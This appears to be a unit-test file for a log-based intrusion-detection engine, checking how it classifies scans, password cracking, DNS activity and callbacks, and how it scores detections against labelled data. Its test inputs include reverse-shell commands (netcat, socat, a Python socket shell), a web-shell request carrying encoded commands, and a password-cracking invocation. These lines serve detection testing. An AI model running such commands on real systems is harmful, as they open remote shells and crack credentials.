import base64
import copy
import csv
import io
import json
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path
from unittest.mock import patch
from urllib.parse import quote

sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from telemetry import normalize, normalize_external, payload_features, CAPABILITIES
from engine import OnlineEngine, classify
from investigation import review
from verification import verify
from fetch_ait_telemetry import select, timestamp, RemoteZip, ranged
import server


def external(line=1, stamp=1642996800, scenario='fox', **fields):
    return normalize_external({'timestamp':stamp,'host':'server','event_type':'telemetry',**fields},scenario,scenario+'.jsonl',line)


def request(command, line=1, training=False):
    encoded=base64.b64encode(json.dumps(command).encode()).decode()
    raw=f'192.0.2.5 - - [24/Jan/2022:04:00:00 +0000] "GET /uploads/shell.php?wp_meta={quote(encoded,safe="")} HTTP/1.1" 200 1'
    return normalize({'AnalysisComponent':{'TrainingMode':training},'LogData':{'Timestamps':[1642996800],'RawLogData':[raw],'LogResources':['/var/log/apache2/intranet-access.log']}},'fox_aminer.json',line)


class ImprovementTests(unittest.TestCase):
    def test_remote_zip_validates_ranges_and_preserves_archive_bytes(self):
        archive=io.BytesIO()
        expected=b'raw log bytes\n'*180000
        with zipfile.ZipFile(archive,'w',compression=zipfile.ZIP_STORED) as z:
            z.writestr('gather/server/logs/auth.log',expected)
        contents=archive.getvalue();requests=[]
        class Response(io.BytesIO):
            status=206
        def opened(request,**kwargs):
            spec=request.get_header('Range').removeprefix('bytes=')
            requests.append((request.full_url,spec))
            if spec.startswith('-'):start,end=max(0,len(contents)-int(spec[1:])),len(contents)-1
            else:start,end=map(int,spec.split('-'))
            result=Response(contents[start:end+1])
            result.headers={'Content-Range':f'bytes {start}-{end}/{len(contents)}'}
            return result
        with patch('fetch_ait_telemetry.urlopen',opened):
            remote=RemoteZip('https://example.invalid/data.zip?download=1')
            with zipfile.ZipFile(remote) as z:
                self.assertEqual(z.read('gather/server/logs/auth.log'),expected)
        self.assertTrue(all('range='+spec in url for url,spec in requests))
        self.assertTrue(all(int(spec.split('-')[1])-int(spec.split('-')[0])+1<=2*1024*1024 for _,spec in requests if not spec.startswith('-')))

    def test_range_refusal_never_reads_a_full_archive(self):
        class Response:
            status=200
            def __enter__(self):return self
            def __exit__(self,*args):pass
            def read(self,*args):raise AssertionError('Full archive was read')
        response=Response()
        with patch('fetch_ait_telemetry.urlopen',return_value=response),patch('fetch_ait_telemetry.time.sleep'):
            with self.assertRaisesRegex(ValueError,'refusing whole-archive'):
                ranged('https://example.invalid/data.zip','0-10',11,0)

    def test_inspector_context_counts_all_members_and_separates_repeats(self):
        engine = OnlineEngine()
        for index in range(10):
            event = external(line=index + 1, stamp=1642996800 + index * 10,
                             src_ip='192.0.2.1', dest_ip=f'192.0.2.{index + 10}')
            event['location'] = '/var/log/network.json'
            engine.ingest(event)
        repeated = dict(event)
        repeated['id'] = 'fox:t:11'
        repeated['training'] = True
        engine.ingest(repeated)
        group = engine.public_group(engine.groups['g1'])
        self.assertEqual(group['count'], 11)
        self.assertEqual(group['unique'], 10)
        self.assertEqual(group['training'], 1)
        self.assertEqual(group['operational_unique'], 10)
        self.assertEqual(group['context']['dst']['total_values'], 10)
        self.assertEqual(sum(row['records'] for row in group['context']['dst']['values']), 11)
        self.assertLess(len(group['evidence']), group['context']['dst']['total_values'])
        self.assertEqual(group['frequency']['repeated_records'], 1)
        self.assertEqual(group['frequency']['duration_seconds'], 90)
        self.assertAlmostEqual(group['frequency']['records_per_minute'], 11 * 60 / 90)
        self.assertNotIn('context_counts', group)
        one = OnlineEngine()
        one.ingest(external())
        self.assertIsNone(one.public_group(one.groups['g1'])['frequency']['records_per_minute'])

    def test_verification_score_counts_windows_and_separates_uncertainty(self):
        with tempfile.TemporaryDirectory() as tmp:
            root=Path(tmp)
            (root/'labels.csv').write_text('scenario,attack,start,end\nfox,cracking,0,10\nfox,cracking,10,20\nfox,cracking,20,30\nfox,cracking,30,40\n')
            outcomes=[(1,'cracking',None,False,'fox',CAPABILITIES['auth']),
                      (2,'cracking',None,False,'fox',CAPABILITIES['auth']),
                      (11,'cracking',None,True,'fox',CAPABILITIES['auth']),
                      (21,'background',None,False,'fox',CAPABILITIES['auth'])]
            frozen=copy.deepcopy(outcomes)
            result=verify(root,'fox',outcomes)
            self.assertEqual(result['score']['percent'],25.0)
            self.assertEqual(result['score']['detected'],1)
            self.assertEqual(result['score']['total'],4)
            self.assertEqual(result['score']['possible_misses'],2)
            self.assertEqual(result['score']['insufficient_telemetry'],1)
            self.assertEqual(result['phases']['cracking']['specific_signal'],1)
            self.assertEqual(outcomes,frozen)
            empty=verify(root,'unlabeled',[])
            self.assertIsNone(empty['score']['percent'])
            self.assertEqual(empty['score']['total'],0)

    def test_password_cracking_wrapper_is_specific_without_claiming_success(self):
        e=request(['./wphashcrack-0.1/wphashcrack.sh','-w','wordlist.txt','-j','./john-1.9.0/run','-u','user'])
        family,confidence,reason=classify(e)
        self.assertEqual(family,'cracking')
        self.assertIn('unknown',reason)
        self.assertNotIn('wphashcrack',json.dumps(OnlineEngine().snapshot()))

    def test_direct_command_and_other_callback_constructs(self):
        for command in ['nc 192.0.2.1 4444 -e /bin/sh','socat TCP:192.0.2.1:4444 EXEC:/bin/bash','python -c "s=socket.socket();s.connect((\"192.0.2.1\",4444));os.dup2(s.fileno(),0)"']:
            self.assertEqual(classify(request([command]))[0],'callback')
        e=external(process={'exe':'/usr/bin/hashcat','command_line':'hashcat hashes.txt'})
        self.assertEqual(classify(e)[0],'cracking')

    def test_all_dns_query_types_and_eve_queries_are_preserved(self):
        for qtype in ('A','AAAA','TXT'):
            e=external(dns={'queries':[{'rrname':'a'*60+'.example.org','rrtype':qtype}]})
            self.assertEqual(classify(e)[0],'dns')
            self.assertTrue(e['capabilities'] & CAPABILITIES['dns'])
        e=external(dns={'queries':[{'rrname':'example.org','rrtype':'A'}]})
        self.assertEqual(classify(e)[0],'background')

    def test_scan_fanout_uses_distinct_connections_and_is_causal(self):
        engine=OnlineEngine()
        for n in range(19):
            e=external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1000+n,flow_id=str(n))
            self.assertEqual(engine.ingest(e)['family'],'background')
        prefix=copy.deepcopy(engine.timeline)
        row=engine.ingest(external(20,1642996819,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1019,flow_id='19'))
        self.assertEqual(row['family'],'recon')
        self.assertEqual(engine.timeline[:19],prefix)
        repeats=OnlineEngine()
        for n in range(60):
            repeats.ingest(external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1000+n,flow_id='same-flow'))
        self.assertEqual(repeats.categories['recon'],0)

    def test_training_and_cross_scenario_do_not_supply_scan_threshold(self):
        engine=OnlineEngine()
        for n in range(25):
            e=external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1000+n,flow_id=str(n),training=True)
            engine.ingest(e)
        self.assertEqual(engine.categories['recon'],0)

        engine=OnlineEngine()
        for name in ('fox','shaw'):
            for n in range(15):engine.ingest(external(n+1,1642996800+n,scenario=name,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1000+n,flow_id=str(n)))
        self.assertEqual(engine.categories['recon'],0)

    def test_icmp_host_discovery_does_not_require_transport_ports(self):
        engine=OnlineEngine()
        for n in range(20):
            e=external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip=f'198.51.100.{n+1}',proto='ICMP',flow_id=str(n))
            self.assertTrue(e['capabilities'] & CAPABILITIES['connection'])
            result=engine.ingest(e)
        self.assertEqual(engine.timeline[-1][6],'scan.fanout')
        mixed=OnlineEngine()
        for n in range(19):mixed.ingest(external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip='198.51.100.1',dest_port=1000+n,proto='TCP',flow_id=str(n)))
        mixed.ingest(external(20,1642996819,src_ip='192.0.2.5',dest_ip='198.51.100.2',proto='ICMP',flow_id='icmp'))
        self.assertEqual(mixed.categories['recon'],0)

    def test_rejected_port_burst_requires_failures_and_distinct_ports(self):
        for reject,ports,expected in ((True,10,'scan.rejected_ports'),(True,1,'routine'),(False,10,'routine')):
            engine=OnlineEngine()
            for n in range(10):
                raw=f'kernel: fw {"REJECT" if reject else "ACCEPT"} SRC=192.0.2.5 DST=192.0.2.8 PROTO=TCP DPT={1000+n%ports} SYN'
                engine.ingest(external(n+1,1642996800+n,src_ip='192.0.2.5',dest_ip='192.0.2.8',dest_port=1000+n%ports,proto='TCP',raw=raw))
            self.assertEqual(engine.timeline[-1][6],expected)

    def test_audit_command_decoding_waits_until_online_ingestion(self):
        command='hashcat\x00hashes.txt'.encode().hex()
        with patch('telemetry.process_features',side_effect=AssertionError('early process inspection')):
            e=external(raw=f'type=PROCTITLE msg=audit(1642996800.0:1): proctitle={command}')
        self.assertEqual(classify(e)[0],'cracking')
        self.assertNotIn(command,e['raw'])
        self.assertNotIn('_process_payload',json.dumps(OnlineEngine().ingest(e)))

    def test_authentication_failure_aggregation(self):
        engine=OnlineEngine()
        for n in range(10):
            row=engine.ingest(external(n+1,1642996800+n,src_ip='192.0.2.5',raw=f'Jan 24 04:00:{n:02} server sshd: Failed password for user from 192.0.2.5 port {3000+n} ssh2'))
        self.assertEqual(row['family'],'cracking')

    def test_late_web_burst_works_and_training_cannot_supply_path_diversity(self):
        engine=OnlineEngine()
        engine.ingest(external(raw='192.0.2.5 - - [24/Jan/2022:04:00:00 +0000] "GET /first HTTP/1.1" 404 1'))
        for n in range(25):
            engine.ingest(external(n+2,1642997100+n,raw=f'192.0.2.5 - - [24/Jan/2022:04:05:00 +0000] "GET /path-{n} HTTP/1.1" 404 1'))
        self.assertTrue(next(iter(engine.groups.values()))['rate_elevated'])
        engine=OnlineEngine()
        for n in range(24):engine.ingest(external(n+1,1642996800+n,training=True,raw=f'192.0.2.5 - - [24/Jan/2022:04:00:00 +0000] "GET /path-{n} HTTP/1.1" 404 1'))
        engine.ingest(external(25,1642996830,raw='192.0.2.5 - - [24/Jan/2022:04:00:30 +0000] "GET /only HTTP/1.1" 404 1'))
        self.assertFalse(next(iter(engine.groups.values()))['rate_elevated'])

    def test_training_duplicate_later_operational_is_retained(self):
        engine=OnlineEngine();engine.ingest(request(['bash','whoami'],training=True));engine.ingest(request(['bash','whoami'],line=2))
        group=engine.public_group(next(iter(engine.groups.values())))
        self.assertEqual(group['operational_unique'],1)
        self.assertTrue(any(not e['training'] for e in group['evidence']))
        self.assertEqual(review(group)['decision'],'investigate')

    def test_verifier_excludes_generic_anomalies_and_distinguishes_training(self):
        with tempfile.TemporaryDirectory() as tmp:
            root=Path(tmp);(root/'labels.csv').write_text('scenario,attack,start,end\nfox,cracking,0,10\nfox,service_stop,10,20\nfox,dnsteal,20,30\n')
            outcomes=((1,'anomaly','g1',False,'fox',CAPABILITIES['auth'],'sensor.anomaly','fox:a:1'),(11,'service','g2',True,'fox',CAPABILITIES['service'],'service.stop','fox:a:2'),(21,'background','g3',False,'fox',0,'routine','fox:w:1'))
            frozen=copy.deepcopy(outcomes);rows=verify(root,'fox',outcomes)['rows']
            self.assertEqual(rows[0]['relevant'],0)
            self.assertEqual(rows[0]['generic_anomalies'],1)
            self.assertEqual([r['evidence_status'] for r in rows],['unsupported_behavior','training_only','insufficient_telemetry'])
            self.assertEqual(outcomes,frozen)

    def test_bounded_review_records_empty_failed_and_never_dismisses_on_absence(self):
        engine=OnlineEngine();engine.ingest(request(['bash','whoami']))
        group=engine.public_group(next(iter(engine.groups.values())))
        def retrieve(field):
            if field=='process':return {'records':[]}
            raise OSError('sensor unavailable')
        before=engine.snapshot();result=review(group,retrieve)
        self.assertEqual(result['decision'],'investigate')
        self.assertEqual(result['queries'],2)
        self.assertEqual([r['outcome'] for r in result['ledger'] if r['kind']=='retrieval'],['empty','failed'])
        self.assertEqual(engine.snapshot(),before)
        with self.assertRaises(ValueError):review(group,retrieve,4)

    def test_no_future_evidence_at_same_timestamp_and_exact_member_pagination(self):
        with tempfile.TemporaryDirectory() as tmp:
            root=Path(tmp);(root/'ait_ads').mkdir();inputs=root/'inputs';inputs.mkdir()
            (root/'ait_ads/fox_wazuh.json').write_text('')
            (root/'ait_ads/fox_aminer.json').write_text('')
            objects=[{'timestamp':1642996800,'host':'server','event_type':'audit','raw':'type=SERVICE_STOP unit=ssh res=success'}, {'timestamp':1642996800,'host':'server','event_type':'audit','raw':'type=SERVICE_STOP unit=cron res=success'}]
            (inputs/'fox.jsonl').write_text('\n'.join(json.dumps(o) for o in objects)+'\n')
            with patch.object(server,'ROOT',root),patch.object(server,'INPUTS',inputs),patch.object(server,'CACHE',root/'cache'),patch.object(server,'CATALOG',{'fox':{'status':'loading'}}):
                server.prepare_worker('fox');run=server.Run('fox',1,'events')
                first=normalize_external(objects[0],'fox','fox.jsonl',1);run.engine.ingest(first);run.virtual=first['timestamp']
                with self.assertRaises(ValueError):run.evidence('fox:n:2')
                gid=next(iter(run.engine.groups))
                result=run.investigate(gid)
                self.assertFalse(any(e['id']=='fox:n:2' for entry in result['ledger'] for e in entry.get('records',[])))
                self.assertEqual([r['id'] for r in run.members(gid)['members']],['fox:n:1'])
                record=run.evidence('fox:n:1');self.assertNotIn('_command',record);self.assertEqual(record['line'],1)

    def test_archive_selection_excludes_attacker_and_labels(self):
        import zipfile
        for name in ('r/gather/intranet_server/logs/audit/audit.log','r/gather/firewall/logs/syslog','r/gather/cloud_share/logs/dnsmasq.log'):
            self.assertTrue(select(zipfile.ZipInfo(name)))
        for name in ('r/labels/cloud_share/logs/dnsmasq.log','r/gather/attacker_0/logs/dnsmasq.log'):
            self.assertFalse(select(zipfile.ZipInfo(name)))
        self.assertEqual(timestamp('type=SYSCALL msg=audit(1642996800.1:9)',2022),1642996800.1)


if __name__=='__main__':unittest.main()
